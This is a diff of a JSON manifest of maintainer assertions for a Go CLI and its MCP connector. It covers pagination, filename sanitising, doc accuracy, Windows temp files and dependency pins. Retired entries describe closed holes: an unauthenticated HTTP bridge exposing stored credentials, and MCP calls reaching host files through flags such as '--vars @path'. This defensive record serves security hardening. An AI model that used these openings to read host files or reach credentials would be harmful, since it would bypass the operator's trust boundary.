+   "asserts": [
+    {
+     "file": "cli/internal/cli/riverside_pages.go",
+     "contains": "func listAll[T any](",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "listStudioProjects(cmd.Context(), c, studio)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "listProjectTakes(cmd.Context(), c, proj.ID)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ready.go",
+     "contains": "listStudioProjects(cmd.Context(), c, studio)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "listProjectTakes(cmd.Context(), c, proj.ID)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/media_refresh.go",
+     "contains": "listAll(cmd.Context(), c,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/clips_list.go",
+     "contains": "listAll(ctx, c,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_pages_test.go",
+     "contains": "func TestListsReadEveryPage(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "long-title-keeps-id",
+   "class": "silent-overwrite",
+   "summary": "sanitize keeps the tail of a name over 80 bytes, so the id and extension survive and the name stays valid UTF-8.",
+   "why": "s[:80] dropped the id and extension, so two items with a long shared title wrote one path and one overwrote the other; it could also split a multibyte rune.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/bulk.go",
+     "contains": "strings.ToValidUTF8(s[len(s)-40:], \"\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_pages_test.go",
+     "contains": "func TestLongTitleKeepsIDAndExtension(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "bulk-export-docs-match-binary",
+   "class": "docs-truth",
+   "summary": "bulk export is described as what it writes: each take's transcript, asset list and HLS manifests, with its resume cursor in <out>/.resume.json; audio and video come from grab. The ready and stale examples name --studio.",
+   "why": "The press text said bulk export downloads per-participant audio with a cursor on .runstate/. It writes no audio or video, so an operator could take a manifest-only archive for a full backup.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "per-participant audio + HLS manifests"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "per-participant audio + HLS manifests"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "per-participant audio + HLS manifests"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": ".runstate/"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": ".runstate/"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": ".runstate/"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "riverside-fm-cli ready --json"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "riverside-fm-cli ready --json"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "riverside-fm-cli stale --days"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "riverside-fm-cli stale --days"
+    }
+   ]
+  },
+  {
+   "id": "doctor-non-2xx-is-not-healthy",
+   "class": "wrong-result",
+   "summary": "doctor reports an error status at its API probe as a WARN that names the base-URL variable, not as reachable.",
+   "why": "A base URL pointing at a host where every API path 404s rendered as 'reachable (HTTP 404 at /)', a health claim for an install that cannot make one call (check_doctor_truth wrong-base).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "\"WARN %s answered HTTP %d: the base URL may not be Riverside's API (set RIVERSIDE_FM_BASE_URL), or the session was refused\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "reachable (HTTP %d at /)"
+    }
+   ]
+  },
+  {
+   "id": "temp-handle-closed-before-kit-write",
+   "class": "windows-rename-of-open-file",
+   "status": "active",
+   "summary": "Every CreateTemp handle (client profile, download, data.db owner marker) is closed before credkit.WriteFile writes the bytes and before the file is renamed, linked or removed. Only the kit writes the bytes.",
+   "why": "Windows refuses to rename or remove an open file, so profile writes, downloads and rate-limit metadata failed there; the raw write also put unchecked bytes on disk before the kit saw them.",
+   "spec_encode_followup": "Press template: write temp files through the kit only after closing the handle.",
+   "asserts": [
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "if err := tmp.Close(); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "if err := f.Close(); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "if err := temp.Close(); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "not_contains": "tmp.Write(data)"
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "not_contains": "f.Write(body)"
+    },
+    {
+     "file": "cli/internal/platform/riverside_temp_handle_test.go",
+     "contains": "func TestWritePrivateFileClosesTempHandle",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/riverside_temp_handle_test.go",
+     "contains": "func TestTempFileWritersCloseTheirHandle",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "brotli-dep-floor",
+   "class": "dependency-floor",
+   "status": "active",
+   "summary": "github.com/andybalholm/brotli raised to v1.2.8 (GO-2026-6888) and github.com/klauspost/compress to v1.20.2 (GO-2026-6865).",
+   "why": "The security gate blocks v1.0.6; a reprint that restores the press's pin reintroduces it.",
+   "spec_encode_followup": "Press dependency floor.",
+   "asserts": [
+    {
+     "file": "cli/go.mod",
+     "contains": "github.com/andybalholm/brotli v1.2.8",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/go.mod",
+     "contains": "github.com/klauspost/compress v1.20.2",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
   },
   {
    "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md, README.md and page.json carry the interim security note and pause the remote-agent recipe (stdio-to-HTTP bridge launch line commented out, no tunnel step) until this connector is reprinted.",
-   "why": "Docs-only interim fix ratified 2026-10-22 (follow-up to #428). This connector is stdio-only, so the remote-agent recipe put it behind a supergateway bridge that adds no password: anyone who can reach the bridge's port can use the MCP tools with the stored credentials. The docs must not tell anyone to run the bridge or tunnel it. mcp-install.md and README.md are regenerated by msp-skills-publish onboard.py (gen_mcp_install, render_readme); this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "the bridge it would need is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "the bridge it would need is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "via the `supergateway` bridge"
-    },
-    {
-     "file": "page.json",
-     "not_contains": "via a secure bridge"
-    }
-   ]
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
   },
   {
    "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path) (plus 1 more, see why)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path); the shell-out layer gained the blockedDestinationFlags floor (db, input, out, output and the rest), which this press-4.4 connector never had. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "chatgpt-desktop-local-web-unsupported",
-   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
-   "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
-   "status": "active",
-   "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "## ChatGPT desktop app (OpenAI)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "## ChatGPT (Developer Mode)"
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "*Remote* agents (ChatGPT"
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nYes, in the **ChatGPT desktop app**.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Plus/Pro+"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Developer Mode"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Microsoft 365 Copilot, Gemini, and any agent"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Yes, in the ChatGPT desktop app.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "connects only to remote"
-    }
-   ]
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
